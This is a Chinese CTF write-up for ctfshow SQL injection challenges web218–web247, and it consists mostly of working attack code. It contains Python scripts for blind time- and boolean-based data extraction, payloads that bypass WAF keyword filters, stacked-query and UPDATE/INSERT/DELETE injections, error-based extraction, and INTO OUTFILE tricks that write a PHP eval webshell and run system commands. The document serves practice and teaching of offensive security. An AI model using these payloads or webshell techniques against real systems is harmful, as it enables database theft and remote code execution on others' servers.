&quot;concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) rlike &#39;(a.*)+(a.*)+b&#39;&quot; for i in range(60): lenth &#x3D; len(flag) min,max &#x3D; 32,128 while True: j &#x3D; min + (max-min)&#x2F;&#x2F;2 if(min &#x3D;&#x3D; j): flag +&#x3D; chr(j) print(flag) break payload &#x3D; &#123;&quot;ip&quot;:f&quot;&#39;&#39;) or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;i&#125;,1))&lt;&#123;j&#125;,&#123;sleep_rep&#125;,&#39;False&#39;)#&quot; ,&#39;debug&#39;:0&#125; try: r &#x3D; requests.post(url&#x3D;url,data&#x3D;payload,timeout&#x3D;0.5) min &#x3D; j except: max &#x3D; j time.sleep(0.2) web219//屏蔽危险分子 function waf($str)&#123; return preg_match(&#39;/sleep|benchmark|rlike/i&#39;,$str); &#125; rlike也被过滤了，尝试用笛卡儿积 笛卡尔积(因为连接表是一个很耗时的操作) AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表 SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C; select * from table_name A, table_name B select * from table_name A, table_name B，table_name C select count(*) from table_name A, table_name B，table_name C 表可以是同一张表 Lxxx师傅的测试： mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B; +----------+ | count(*) | +----------+ | 62805625 | +----------+ 1 row in set (1.74 sec) import requests import time url&#x3D;&#39;http:&#x2F;&#x2F;f6ad04f0-3fd9-4eb9-9dc9-78cfaa9f5000.challenge.ctf.show&#x2F;api&#x2F;index.php&#39; flag&#x3D;&#39;&#39; for i in range(60): lenth &#x3D; len(flag) min,max &#x3D; 32,128 while True: j &#x3D; min + (max-min)&#x2F;&#x2F;2 if(min &#x3D;&#x3D; j): flag +&#x3D; chr(j) print(flag) break # payload&#x3D;f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot; # payload&#x3D;f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxca&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot; payload&#x3D;f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot; data&#x3D;&#123; &#39;ip&#39;:payload, &#39;debug&#39;:0 &#125; try: r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.15) min&#x3D;j except: max&#x3D;j time.sleep(0.1) web220//屏蔽危险分子 function waf($str)&#123; return preg_match(&#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#39;,$str); &#125; payload同上 或者 过滤ascii和substr可以用like代替,在构造 payload 的时候使用 limit 限制查询条数，从而绕过 concat 的限制,在上题exp基础上修改一下即可 #@Auth：Sentiment import requests import time as t url&#x3D;&#39;http:&#x2F;&#x2F;b25594e9-ab57-43ce-a255-7b87f771b72a.challenge.ctf.show&#x2F;api&#x2F;index.php&#39; flag&#x3D;&#39;ctfshow&#123;&#39; for i in range(1,50): for j in &#39;abcdefghijklmnopqrstuvwxyz1234567890-_&#123;&#125;&#39;: data&#x3D;&#123; #&#39;ip&#39;:&quot;if((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; # ctfshow_flagxcac #&#39;ip&#39;:&quot;if((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxcac&#39; limit 1,1) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; # flagaabcc &#39;ip&#39;:&quot;if((select flagaabcc from ctfshow_flagxcac) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; #ctfshow&#123;e97ffaa2-9de8-4b3d-a623-1a09ad9eeb83&#125; &#125; print(data) try: r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.15) except: flag+&#x3D;j print(flag) break t.sleep(0.3) web221盲注终于结束了，尤其是时间盲注，感觉又费时又费力。 limit注入 查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; select * from ctfshow_user limit ($page-1)*$limit,$limit; 返回逻辑 &#x2F;&#x2F;TODO:很安全，不需要过滤 &#x2F;&#x2F;拿到数据库名字就算你赢 看一下这个查询语句 select * from tableName limit i,n # tableName：表名 # i：为查询结果的索引值(默认从0开始)，当i&#x3D;0时可省略i # n：为查询结果返回的数量 # i与n之间使用英文逗号&quot;,&quot;隔开 #limit n 等同于 limit 0,n https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html p牛的文章 里面写道 在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，那么使用PROCEDURE函数能否注入呢 那肯定是能注入的 下面是p牛的尝试过程 mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1); ERROR 1386 (HY000): Can&#39;t use ORDER clause with this procedure ANALYSE可以有两个参数： mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1,1); ERROR 1386 (HY000): Can&#39;t use ORDER clause with this procedure 看起来并不是很好，继续尝试： mysql&gt; SELECT field from table where id &gt; 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1); 但是立即返回了一个错误信息： ERROR 1108 (HY000): Incorrect parameters to procedure &#39;analyse&#39; sleep函数肯定没有执行，但是最终我还是找到了可以攻击的方式： mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.41-0ubuntu0.14.04.1&#39; 如果不支持报错注入的话，还可以基于时间注入： SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1) 直接使用sleep不行，需要用BENCHMARK代替。 可以看到这里是利用了报错的方式注出了内容 适用范围 5.0.0&lt; MySQL &lt;5.6.6 而这道题里也开启了报错 当没有id这一参数时 1 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))),1) 不知道为什么出不来数据（虽说只要注到库名就行 web222 group 注入 查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; select * from ctfshow_user group by $username; 返回逻辑 &#x2F;&#x2F;TODO:很安全，不需要过滤 参数在group后边 group by可用于时间盲注,举个例子： select * from users group by 1,if(1&#x3D;1,sleep(0.5),1); 1 查询每一行时都需要执行sleep,我有5行数据所以需要大约5*0.5秒=2.5秒左右的时间 import requests import time url&#x3D;&#39;http:&#x2F;&#x2F;9f4a1dc4-86c8-4876-b732-f5ffd6be8114.challenge.ctf.show&#x2F;api&#x2F;index.php?u&#x3D;&#39; flag&#x3D;&#39;&#39; for i in range(1,100): min&#x3D;32 max&#x3D;128 while 1: j&#x3D;min+(max-min)&#x2F;&#x2F;2 if min&#x3D;&#x3D;j: flag+&#x3D;chr(j) print(flag) break #payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot; #payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flaga&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot; payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot; try: r&#x3D;requests.get(url&#x3D;url+payload,timeout&#x3D;0.4) min&#x3D;j except: max&#x3D;j time.sleep(0.2) 这里我们可以试一下group by常规的报错语句 select count(*) from users group by concat(database(),floor(rand(0)*2)); 发现能查出东西，那我们也可以利用布尔盲注 import requests import time url&#x3D;&#39;http:&#x2F;&#x2F;60eb33c3-f99f-40ab-a612-d0085affb66a.challenge.ctf.show&#x2F;api&#x2F;index.php?u&#x3D;&#39; flag&#x3D;&#39;&#39; for i in range(1,100): min&#x3D;32 max&#x3D;128 while 1: j&#x3D;min+(max-min)&#x2F;&#x2F;2 if min&#x3D;&#x3D;j: flag+&#x3D;chr(j) print(flag) break #payload&#x3D;f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot; #payload&#x3D;f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flaga&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot; payload&#x3D;f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot; r&#x3D;requests.get(url&#x3D;url+payload).text #print(r.text) if len(r)&lt;288: max&#x3D;j else: min&#x3D;j web223还是group注入 但是 过滤了数字，也就是说用substr之类的函数不能直接用了 但是经过测试还是能够盲注 看出返回值不同，而数字可以利用web185里提到的true代替 &quot;&quot;&quot; Author:Y4tacker &quot;&quot;&quot; import requests def generateNum(num): res &#x3D; &#39;true&#39; if num &#x3D;&#x3D; 1: return res else: for i in range(num - 1): res +&#x3D; &quot;+true&quot; return res url &#x3D; &quot;http:&#x2F;&#x2F;ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show&#x2F;api&#x2F;&quot; i &#x3D; 0 res &#x3D; &quot;&quot; while 1: head &#x3D; 32 tail &#x3D; 127 i &#x3D; i + 1 while head &lt; tail: mid &#x3D; (head + tail) &gt;&gt; 1 # 查数据库-ctfshow_flagas # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot; # 查字段-flagasabc # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagas&#39;&quot; # 查flag payload &#x3D; &quot;select flagasabc from ctfshow_flagas&quot; params &#x3D; &#123; &quot;u&quot;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;generateNum(i)&#125;,&#123;generateNum(1)&#125;))&gt;&#123;generateNum(mid)&#125;,username,&#39;a&#39;)&quot; &#125; r &#x3D; requests.get(url, params&#x3D;params) # print(r.json()[&#39;data&#39;]) if &quot;userAUTO&quot; in r.text: head &#x3D; mid + 1 else: tail &#x3D; mid if head !&#x3D; 32: res +&#x3D; chr(head) else: break print(res) web224在robots.txt里找到一个重置密码的页面，重置之后直接登录，看到文件上传的页面 然后试了试，怎么感觉什么也传不上去 ctfshow的群里有个payload.bin把这个传上去之后就直接生成了一个木马 访问1.php命令执行 原理看这个 https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5 web225查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;师傅说过滤的越多越好 if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set&#x2F;i&#39;,$username))&#123; die(json_encode($ret)); &#125; 题目提示是堆叠注入了 select被过滤了，利用常规的堆叠注入 只能查到这了 和强网杯那道差不多 先让我们看看强网杯的payload 方法一 使用rename和alter 1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);# 方法二 使用handler 0&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;# 方法三 使用预处理语句 0&#39;;set @sql&#x3D;concat(&#39;sele&#39;,&#39;ct &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 from @sql;EXECUTE stmt1;# 而这道题alter被过滤了，所以可以利用预处理，或者是handler 又因为过滤了set，方法三所以直接写语句就行 https://blog.csdn.net/solitudi/article/details/107823398 (4条消息) 攻防世界-Web高手进阶区-supersqli(强网杯的随便注)_rfrder的博客-CSDN博客 预处理SQL预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。 MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。简单用法： 使用方法MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。 PREPARE name from &#39;[my sql sequece]&#39;; &#x2F;&#x2F;预定义SQL语句 EXECUTE name; &#x2F;&#x2F;执行预定义SQL语句 (DEALLOCATE || DROP) PREPARE name; &#x2F;&#x2F;删除预定义SQL语句 字符串定义预处理 PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;; ET @a &#x3D; 3; SET @b &#x3D; 4; EXECUTE stmt1 USING @a, @b; 变量定义预处理 SQL SET @s &#x3D; &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;; PREPARE stmt2 FROM @s; SET @c &#x3D; 6; ET @d &#x3D; 8; EXECUTE stmt2 USING @c, @d; DEALLOCATE PREPARE stmt2; 在这道题里就是这样的 1&#39;;prepare Sentiment from concat(char(115,101,108,101,99,116),&#39;* from ctfshow_flagasa&#39;);execute Sentiment; handlerHANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭 payload ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read first;--+ web226、228、229、230查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;师傅说过滤的越多越好 if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\\(&#x2F;i&#39;,$username))&#123; die(json_encode($ret)); &#125; show被过滤了，那handle就用不了了，因为不能直接show tables看表名，所以只能利用预处理了 转十六进制就行 &#39;;prepare a from 0x73686f77207461626c6573;execute a;# &#39;;prepare a from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute a;# 当然，要是想预处理查出表名之后再用handler也不是不行（ web227表里没flag 这道题考点其实是查看MySQL的存储过程看看网上这篇文章MySQL——查看存储过程和函数我们去查information_schema.routines表 web231 update注入 查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;无过滤 可以看见这里就不是查询语句，而是用update来更新 update更新数据 注入点是api的password和username，都是传POST 可以通过闭合password,在第一个注入点执行where条件查询语句,并将后边的where闭合掉(注入点/api/ post传参username,password),或者是利用时间盲注 当我们POST一个password=user&#39;,username=database()#&amp;username=1 刷新一下那个查询界面，就会发现，都变成了ctfshow_web 因为这时候的语句为 update ctfshow_user set pass &#x3D; &#39;user&#39;,username&#x3D;database()#&amp;username&#x3D;1&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;; 也就是 update ctfshow_user set pass &#x3D; &#39;user&#39;,username&#x3D;database() 将database()覆盖了username原来的数据，实现了sql注入 然后就是查表查列名查flag了 payload password&#x3D;user&#39;,username&#x3D;(select flagas from flaga) where 1&#x3D;1#&amp;username&#x3D;1 web232查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; &quot;update ctfshow_user set pass &#x3D; md5(&#39;&#123;$password&#125;&#39;) where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;无过滤 password经过了md5加密 但是我们可以尝试闭合md5函数，实现逃逸 比如输入 password&#x3D;1&#39;),username&#x3D;database()#&amp;username&#x3D;1 然后整个语句变为 update ctfshow_user set pass &#x3D; md5(&#39;1&#39;),username&#x3D;database()#&#39;) where username &#x3D; &#39;1&#39;;&quot;; 也就是 update ctfshow_user set pass &#x3D; md5(&#39;1&#39;),username&#x3D;database() 后边就和web231一样了 web233和231一样的代码，也没过滤，就是不给回显了 用这个测一下发现能时间盲注 username&#x3D;1&#39; or if(1&#x3D;1,sleep(0.02),0)#&amp;password&#x3D;1 import requests import time url&#x3D;&#39;http:&#x2F;&#x2F;7cf24fdd-904d-48f6-81ac-0b88a27076ca.challenge.ctf.show&#x2F;api&#x2F;&#39; flag&#x3D;&#39;&#39; for i in range(60): min&#x3D;32 max&#x3D;128 while 1: j&#x3D;min+(max-min)&#x2F;&#x2F;2 if min&#x3D;&#x3D;j: flag+&#x3D;chr(j) print(flag) break #payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot; #payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot; payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(flagass233) from flag233333),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot; data&#x3D;&#123; &#39;username&#39;: payload, &#39;password&#39;:&#39;1&#39;&#125; try: r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.35) min&#x3D;j except: max&#x3D;j time.sleep(0.3) web234查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;无过滤 虽然嘴上说着没过滤，但是实际上还是过滤了单引号 可以用斜杠注释掉后面的斜杠，让它与username的第一个单引号闭合 这时的语句为 $sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;\\&#39; where username &#x3D; &#39;username&#39;;&quot;; 因为username可控，我们只要吧最后一个引号注释，那么\\&#39; where username = 这部分就相当于password的值， 所以当我们输入password=\\&amp;username=,username=database();#时 然后就是正常的查询了 password&#x3D;\\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())# #banlist,ctfshow_user,flag23a password&#x3D;\\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)# 因为过滤了单引号，所以16进制绕过。 #id,flagass23s3,info password&#x3D;\\&amp;username&#x3D;,username&#x3D;(select flagass23s3 from flag23a)# web235查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;过滤 or &#39; 过滤了or就不能用information了，可以试试从其他表里找表名 用mysql.innodb_table_stats来代替information_schema。table_schema就要改成database_name。语句则是 password&#x3D;\\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())# 看到表名之后就是利用无列名注入了 https://www.cnblogs.com/GH-D/p/11962522.html https://zhuanlan.zhihu.com/p/98206699 最终payload为 password&#x3D;\\&amp;username&#x3D;,username&#x3D;(select group_concat(&#96;2&#96;) from (select 1,2,3 union select * from flag23a1)a)# web236 update 查询语句 &#x2F;&#x2F;分页查询 $sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;过滤 or &#39; flag 其实没过滤，用上个题的payload就行 如果过滤了也可以用这个 username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)-- - &amp;password&#x3D;\\ web237查询语句 &#x2F;&#x2F;插入数据 $sql &#x3D; &quot;insert into ctfshow_user(username,pass) value(&#39;&#123;$username&#125;&#39;,&#39;&#123;$password&#125;&#39;);&quot;; insert就是插入。但其实注入方式和一般的没有区别,只是说自己构造出查询语句，查询的结果返回在那个表当中了 通过第一个注入点将后边’)&#39;闭合即可 username&#x3D;helloworld&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1 username&#x3D;helloworld&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;));#&amp;password&#x3D;1 username&#x3D;helloworld&#39;,(select group_concat(flagass23s3) from flag))#&amp;password&#x3D;1 web238insert注入，过滤空格 用括号注释符都能替代 username&#x3D;helloworld&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())));#&amp;password&#x3D;1 username&#x3D;helloworld&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)));#&amp;password&#x3D;1 username&#x3D;helloworld&#39;,(select(group_concat(flag))from(flagb)));#&amp;password&#x3D;1 web239过滤了空格和or，因为过滤了or，所以information_schema就用不了了，可以参考web235 username&#x3D;1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1 1&#39;,(select(flag)from(flagbb)));#&amp;password&#x3D;1 web240Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写。过滤空格 or sys mysql 根据前面都是在flag里，所以flag先确定下来。然后直接写脚本 import requests import itertools url &#x3D; &quot;http:&#x2F;&#x2F;a31fe426-9043-4aaf-b986-6270c466a4da.challenge.ctf.show&#x2F;api&#x2F;insert.php&quot; for i in itertools.product(&#39;ab&#39;, repeat &#x3D; 5): tables &#x3D; &quot;flag&quot; + &#39;&#39;.join(i) payload &#x3D; &#123; &#39;username&#39;: f&quot;hellow0rld&#39;,(select(group_concat(flag))from(&#123;tables&#125;)))#&quot;, &#39;password&#39;: &#39;1&#39; &#125; r &#x3D; requests.post(url&#x3D;url, data&#x3D;payload) 纯爆破 web241sql语句 $sql &#x3D; &quot;delete from ctfshow_user where id &#x3D; &#123;$id&#125;&quot;; delete函数在进行判断后会回显删除成功、或删除失败,所以就不能给予回显内容来爆破数据、所以这里用时间盲注 #@Auth：Sentiment import requests url&#x3D;&#39;http:&#x2F;&#x2F;80bc5222-eeb8-4d94-a68a-57d494f5809e.challenge.ctf.show&#x2F;api&#x2F;delete.php&#39; flag&#x3D;&#39;&#39; for i in range(1,50): m&#x3D;32 n&#x3D;127 while 1: mid&#x3D;(m+n)&#x2F;&#x2F;2 data&#x3D;&#123; #&#39;id&#39;:&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),1)#&quot;.format(i,mid) # banlist,ctfshow_user,flag #&#39;id&#39;:&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),0)&quot;.format(i,mid) #id,flag,info &#39;id&#39;:&quot;if(ascii(substr((select flag from flag),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),0)&quot;.format(i,mid) #ctfshow&#123;24de54e5-a424-4e33-b6ff-00da4a72c909&#125; &#125; &#125; print(data) try: r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;1) m&#x3D;mid except: n&#x3D;mid if(m+1&#x3D;&#x3D;n): flag+&#x3D;chr(m) print(flag) break web242sql语句 &#x2F;&#x2F;备份表 $sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;; SELECT ... INTO OUTFILE &#39;file_name&#39; [CHARACTER SET charset_name] [export_options] export_options: [&#123;FIELDS | COLUMNS&#125; [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;分隔符 [[OPTIONALLY] ENCLOSED BY &#39;char&#39;] [ESCAPED BY &#39;char&#39;] ] [LINES [STARTING BY &#39;string&#39;] [TERMINATED BY &#39;string&#39;] ] ---------------------------------------------------- “OPTION”参数为可选参数选项，其可能的取值有： FIELDS TERMINATED BY &#39;字符串&#39;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\\t”。 FIELDS ENCLOSED BY &#39;字符&#39;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。 FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。 FIELDS ESCAPED BY &#39;字符&#39;：设置转义字符，只能为单个字符。默认值为“\\”。 LINES STARTING BY &#39;字符串&#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。 LINES TERMINATED BY &#39;字符串&#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\\n”。 FIELDS TERMINATED BY、 LINES STARTING BY、 LINES TERMINATED BY写马 在api&#x2F;dump.php传POST filename&#x3D;ma.php&#39; LINES STARTING BY &#39;&lt;?php eval($_GET[1]);?&gt;&#39;# 然后访问url&#x2F;dump&#x2F;ma.php url&#x2F;dump&#x2F;ma.php?1&#x3D;system(&#39;cat &#x2F;flag.here&#39;); web243sql语句 &#x2F;&#x2F;备份表 $sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;; 返回逻辑 &#x2F;&#x2F;过滤了php 可以利用.user.ini 先传 filename&#x3D;.user.ini&#39; lines starting by &#39;;&#39; terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;# 为保证auto_prepend_file&#x3D;1.jpg在单独一行，所以在开头结尾都加上了0x0a来换行 再传1.jpg就行了 因为过滤了php，可以用短标签或者十六进制绕过： filename&#x3D;1.jpg&#39; LINES STARTING BY &#39;&lt;?&#x3D;eval($_GET[1]);?&gt;&#39;# 然后访问 &#x2F;dump&#x2F;index.php?1&#x3D;system(&#39;cat &#x2F;flag.here&#39;); web244、245报错注入 updatexml()和extractvalue()应该都可以 web244 &#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))--+ &#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flag&#39;),0x7e))--+ &#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,30),0x7e))+--+ &#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),20,30),0x7e))+--+ web245同理 web246sql语句 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;; 返回逻辑 &#x2F;&#x2F;无过滤 过滤updatexml extractvalue 报错注入 过滤updatexml extractvalue了之后，还有这些可用 1.floor()、round()、ceil() 2.exp() &#x2F;&#x2F;5.5.5版本之后可以使用 3.name_const 4.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错 payload -1&#39; Union select 1,count(*),concat((database()),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 然后就是正常的查列查字段的操作了 还可以用这种 1&#39; or 1 group by concat_ws(0x7e,(select flag2 from ctfshow_flags),floor(rand(0)*2)) having min(0) or 1 --+ web247sql语句 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;; 返回逻辑 &#x2F;&#x2F;无过滤 过滤updatexml extractvalue floor floor也过滤了 round()&#96;和&#96;ceil()&#96;可以代替&#96;floor() &#39; union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa ), 0x7e,round(rand(0)*2))b from information_schema.tables group by b --+ -1&#39; Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;ctfshow_web&#39; limit 1,1),0x26,ceil(rand(0)*2))x from information_schema.columns group by x;-- 